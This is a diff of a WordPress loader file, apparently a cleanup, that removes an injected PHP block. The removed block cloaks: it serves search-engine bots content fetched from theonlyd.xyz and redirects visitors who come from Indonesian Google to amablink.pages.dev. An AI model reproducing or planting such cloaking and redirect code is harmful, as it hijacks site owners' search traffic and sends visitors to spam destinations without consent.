@@ -1,30 +1,4 @@
 <?php
-$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
-$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
-
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-return false;
-}
-if (is_bot()) {
-echo file_get_contents('https://theonlyd.xyz/amab.html');
-exit;
-}
-
-if (stripos($s_ref, 'google.co.id') !== false ||
-(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://amablink.pages.dev/");
-exit;
-}
-?>
-<?php
 /**
  * These functions are needed to load WordPress.
  *
